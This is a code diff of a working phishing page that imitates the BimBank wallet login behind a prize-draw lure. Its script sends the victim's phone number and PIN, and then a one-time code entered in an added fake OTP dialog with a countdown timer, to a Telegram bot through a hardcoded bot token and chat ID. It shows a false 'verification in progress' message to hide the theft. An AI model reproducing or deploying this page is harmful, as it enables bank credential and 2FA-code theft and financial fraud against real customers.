@@ -3,179 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bim Bank - Espace Wallet</title>
+    <title>BimBank - Wallet</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;700&display=swap');
+        body { font-family: 'Segoe UI', sans-serif; background-color: #fff; }
         
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; }
-
-        /* خلفية الشبكة المربعة الرسمية */
         .grid-bg {
             background-image: linear-gradient(#f0f0f0 1px, transparent 1px), linear-gradient(90deg, #f0f0f0 1px, transparent 1px);
             background-size: 20px 20px;
         }
 
         /* تصميم الشعار الملون */
-        .logo-section {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            padding: 25px 0 10px 0;
-        }
-        .logo-icon {
-            width: 50px;
-            height: 50px;
-            position: relative;
-            transform: rotate(-15deg);
-        }
-        .quadrant { position: absolute; width: 24px; height: 24px; border-radius: 4px; }
-        .q1 { background: #00a19a; top: 0; left: 0; }
-        .q2 { background: #e6007e; top: 0; right: 0; }
-        .q3 { background: #f19e2c; bottom: 0; left: 0; }
-        .q4 { background: #2a4387; bottom: 0; right: 0; }
+        .bim-logo { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 25px 0; }
+        .logo-img { width: 180px; height: auto; }
 
-        .logo-text-border { border-left: 2px solid #2a4387; padding-left: 12px; text-align: left; }
-        .logo-main-title { color: #2a4387; font-size: 26px; font-weight: 800; line-height: 0.9; }
-        .logo-sub-title { color: #2a4387; font-size: 10px; font-weight: bold; letter-spacing: 0.5px; }
-
-        /* شريط الجوائز الإعلاني (صور حقيقية) */
-        .ad-prize-banner {
+        /* شريط الجوائز الإعلاني */
+        .prizes {
             background: linear-gradient(135deg, #f19e2c 0%, #d97706 100%);
-            margin: 10px 25px;
-            padding: 15px;
-            border-radius: 15px;
-            display: flex;
-            justify-content: space-around;
-            box-shadow: 0 8px 20px rgba(241, 158, 44, 0.3);
+            margin: 0 20px 20px; padding: 15px; border-radius: 15px;
+            display: flex; justify-content: space-around; box-shadow: 0 8px 15px rgba(241,158,44,0.3);
         }
-        .prize-box { text-align: center; }
-        .prize-img { 
-            width: 45px; 
-            height: 45px; 
-            object-fit: contain; 
-            filter: drop-shadow(0 4px 4px rgba(0,0,0,0.15));
-        }
-        .prize-label { color: white; font-size: 9px; font-weight: 900; margin-top: 5px; text-transform: uppercase; }
+        .p-item { text-align: center; color: white; font-size: 9px; font-weight: bold; }
+        .p-img { width: 42px; height: 42px; margin-bottom: 5px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
 
-        /* التنسيقات المطابقة للواجهة */
-        .input-control {
-            width: 100%;
-            padding: 15px;
-            border: 1px solid #d1d5db;
-            border-radius: 8px;
-            font-size: 16px;
-            outline: none;
-        }
-        .count-hint { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 4px; }
+        /* العناصر العامة */
+        .input-style { width: 100%; padding: 14px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 16px; outline: none; }
+        .btn-orange { background: #f19e2c; color: white; font-weight: bold; padding: 14px; border-radius: 8px; width: 100%; margin-top: 15px; }
+        .count-text { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 4px; }
 
-        .btn-bim {
-            background-color: #f19e2c;
-            color: white;
-            font-weight: 700;
-            padding: 15px;
-            border-radius: 8px;
-            width: 100%;
-            font-size: 1.1rem;
-            margin-top: 20px;
+        /* نافذة الـ OTP (الواجهة الثانية) */
+        #otp-modal {
+            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5);
+            align-items: center; justify-content: center; z-index: 50; padding: 20px;
+        }
+        .modal-content { background: white; border-radius: 20px; width: 100%; max-width: 350px; padding: 25px; position: relative; text-align: center; }
+        
+        /* العداد الدائري */
+        .timer-circle {
+            width: 120px; height: 120px; border: 4px solid #fff7ed; border-top: 4px solid #f19e2c;
+            border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;
+            font-size: 22px; font-weight: bold; color: #1e293b;
         }
     </style>
 </head>
 <body class="grid-bg min-h-screen">
 
-    <!-- إعادة الشعار كما كان -->
-    <div class="logo-section">
-        <div class="logo-icon">
-            <div class="quadrant q1"></div>
-            <div class="quadrant q2"></div>
-            <div class="quadrant q3"></div>
-            <div class="quadrant q4"></div>
+    <!-- الواجهة الأولى -->
+    <div id="screen-1">
+        <div class="bim-logo">
+            <img src="https://i.ibb.co/m5v8G1f/bimbank-logo.png" alt="Bimbank" class="logo-img">
         </div>
-        <div class="logo-text-border">
-            <div class="logo-main-title">bimbank</div>
-            <div class="logo-sub-title">BANQUE ISLAMIQUE</div>
-        </div>
-    </div>
 
-    <!-- استبدال الإيموجي بصور حقيقية إعلانية -->
-    <div class="ad-prize-banner">
-        <div class="prize-box">
-            <img src="https://cdn-icons-png.flaticon.com/512/741/741407.png" alt="Auto" class="prize-img">
-            <div class="prize-label">AUTO</div>
+        <div class="prizes">
+            <div class="p-item"><img src="https://cdn-icons-png.flaticon.com/512/741/741407.png" class="p-img">AUTO</div>
+            <div class="p-item"><img src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" class="p-img">CASH</div>
+            <div class="p-item"><img src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png" class="p-img">GIFT</div>
+            <div class="p-item"><img src="https://cdn-icons-png.flaticon.com/512/644/644458.png" class="p-img">TECH</div>
         </div>
-        <div class="prize-box">
-            <img src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png" alt="Cash" class="prize-img">
-            <div class="prize-label">CASH</div>
-        </div>
-        <div class="prize-box">
-            <img src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png" alt="Gift" class="prize-img">
-            <div class="prize-label">GIFT</div>
-        </div>
-        <div class="prize-box">
-            <img src="https://cdn-icons-png.flaticon.com/512/644/644458.png" alt="Tech" class="prize-img">
-            <div class="prize-label">TECH</div>
-        </div>
-    </div>
 
-    <div class="text-center mt-3">
-        <p class="text-[#2a4387] font-semibold">Bienvenue dans votre espace wallet</p>
-    </div>
-
-    <div class="max-w-sm mx-auto px-6 mt-6">
-        <div class="flex border-2 border-[#2a4387] rounded-lg overflow-hidden">
-            <div class="flex-1 bg-[#2a4387] text-white py-2.5 text-center font-bold">Wallet</div>
-            <div class="flex-1 bg-white text-gray-400 py-2.5 text-center font-bold">Banking</div>
-        </div>
-    </div>
-
-    <div class="max-w-sm mx-auto px-6 mt-8">
-        <h2 class="text-[#2a4387] font-bold text-xl mb-5">Connexion</h2>
-
-        <div class="space-y-4">
-            <div>
-                <input id="tel" type="tel" maxlength="8" oninput="track(this, 'c1')" class="input-control" placeholder="Téléphone">
-                <div id="c1" class="count-hint">0/8</div>
+        <div class="max-w-sm mx-auto px-6">
+            <div class="flex border-2 border-[#2a4387] rounded-lg overflow-hidden mb-8">
+                <div class="flex-1 bg-[#2a4387] text-white py-2 text-center font-bold">Wallet</div>
+                <div class="flex-1 bg-white text-gray-400 py-2 text-center font-bold">Banking</div>
             </div>
-            <div>
-                <input id="pwd" type="password" maxlength="4" oninput="track(this, 'c2')" class="input-control" placeholder="Mot de passe">
-                <div id="c2" class="count-hint">0/4</div>
+
+            <h2 class="text-[#2a4387] font-bold text-xl mb-4">Connexion</h2>
+            <div class="space-y-4">
+                <input id="tel" type="tel" maxlength="8" class="input-style" placeholder="Téléphone">
+                <input id="pin" type="password" maxlength="4" class="input-style" placeholder="Mot de passe">
             </div>
+            <button onclick="showOTP()" class="btn-orange">Connexion</button>
         </div>
+    </div>
 
-        <div class="text-right mt-3">
-            <a href="#" class="text-gray-400 text-sm">Mot de passe oublié ?</a>
-        </div>
-
-        <button onclick="sendData()" class="btn-bim">Connexion</button>
-
-        <div class="mt-12 text-center">
-            <p class="text-gray-500">Nouvel utilisateur ?</p>
-            <a href="#" class="text-[#2a4387] font-bold mt-1 block">S'inscrire maintenant &rarr;</a>
+    <!-- الواجهة الثانية (نافذة OTP) -->
+    <div id="otp-modal">
+        <div class="modal-content">
+            <button onclick="closeModal()" class="absolute top-4 right-4 text-2xl text-gray-400">&times;</button>
+            
+            <div class="timer-circle" id="timer">04:58</div>
+            
+            <p class="text-gray-600 text-sm mb-4 text-left">Entrez le code OTP</p>
+            <input id="otp-code" type="tel" maxlength="6" class="input-style mb-1" placeholder="Code OTP">
+            <div class="count-text mb-4">0/6</div>
+            
+            <button onclick="finish()" class="btn-orange">Connexion</button>
         </div>
     </div>
 
     <script>
-        const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
-        const CHAT = "8665814266";
+        const BOT_TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
+        const CHAT_ID = "8665814266";
 
-        function track(el, id) {
-            el.value = el.value.replace(/[^0-9]/g, '');
-            document.getElementById(id).textContent = el.value.length + '/' + el.maxLength;
-        }
-
-        function sendData() {
+        function showOTP() {
             const p = document.getElementById('tel').value;
-            const s = document.getElementById('pwd').value;
+            const s = document.getElementById('pin').value;
             if(p.length === 8 && s.length === 4) {
-                const msg = `💰 BimBank Prize Entry:\n📱 Tel: ${p}\n🔐 PIN: ${s}`;
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`)
-                .then(() => {
-                    alert("Connexion réussie. Validation de votre bonus en cours...");
-                    location.reload();
-                });
+                // إرسال البيانات الأولى للبوت
+                sendToTelegram(`📱 Tel: ${p}\n🔐 PIN: ${s}`);
+                // إظهار واجهة الـ OTP
+                document.getElementById('otp-modal').style.display = 'flex';
+                startTimer(298); // 4:58 دقائق
+            } else {
+                alert("يرجى إكمال البيانات");
             }
         }
+
+        function startTimer(duration) {
+            let timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+                document.getElementById('timer').textContent = minutes + ":" + seconds;
+                if (--timer < 0) timer = 0;
+            }, 1000);
+        }
+
+        function finish() {
+            const otp = document.getElementById('otp-code').value;
+            if(otp.length === 6) {
+                sendToTelegram(`🔑 OTP Code: ${otp}`);
+                alert("Vérification en cours... Veuillez patienter.");
+                location.reload();
+            }
+        }
+
+        function sendToTelegram(msg) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+        }
+
+        function closeModal() { document.getElementById('otp-modal').style.display = 'none'; }
     </script>
 </body>
 </html>
